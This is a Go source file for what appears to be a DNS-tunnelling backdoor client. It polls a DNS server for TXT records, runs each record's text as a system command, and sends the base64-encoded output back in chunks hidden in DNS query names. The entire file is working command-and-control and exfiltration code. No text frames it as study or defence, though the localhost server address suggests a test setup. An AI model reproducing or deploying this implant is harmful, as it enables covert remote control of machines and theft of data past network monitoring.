package main

import (
	"encoding/base64"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"
)

const (
	host        = "127.0.0.1:8053"
	maxMsgLen   = 66
	metaInfoLen = 30
	delay       = 500 * time.Millisecond
)

func main() {
	m := new(dns.Msg)
	m.SetQuestion("google.com.", dns.TypeTXT)

	for {
		// Do you Have something for me?
		r, err := dns.Exchange(m, host)
		if err != nil {
			fmt.Println("cannot reach the server")
		}
		if r != nil {
			for _, a := range r.Answer {
				if txt, ok := a.(*dns.TXT); ok {
					if txt.Txt[0] == "" {
						break
					}

					cmd := strings.Split(txt.Txt[0], " ")
					cmdToExecute := cmd[0]
					cmdArgs := cmd[1:]
					fmt.Println(cmd)

					nm := new(dns.Msg)

					out, err := exec.Command(cmdToExecute, cmdArgs...).CombinedOutput()
					if err != nil {
						fmt.Println(err)
						out = []byte(" ")
					}
					outEnc := base64.StdEncoding.EncodeToString(out)
					baseUrl := "syl.sh"

					// Add Space for META inf
					dataLeft := (maxMsgLen - len(baseUrl)) - metaInfoLen

					chunks := Chunks(outEnc, dataLeft)
					for i, chunkOut := range chunks {
						chunkLen := strconv.Itoa(len(chunks))
						currentChunk := strconv.Itoa((i + 1))

						// Build the Chunk URL
						chunkUrl := baseUrl +
							"?" + "cs=" + chunkLen +
							"&" + "cc=" + currentChunk +
							"&" + "o=" + chunkOut +
							"."

						fmt.Println(chunkUrl)
						nm.SetQuestion(chunkUrl, dns.TypeTXT)
						_, err := dns.Exchange(nm, host)
						if err != nil {
							fmt.Printf("%s err\n", err)
						}
					}
				}
			}
		}
		time.Sleep(delay)
	}
}

func Chunks(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
	currentLen := 0
	currentStart := 0
	for i := range s {
		if currentLen == chunkSize {
			chunks = append(chunks, s[currentStart:i])
			currentLen = 0
			currentStart = i
		}
		currentLen++
	}
	chunks = append(chunks, s[currentStart:])
	return chunks
}
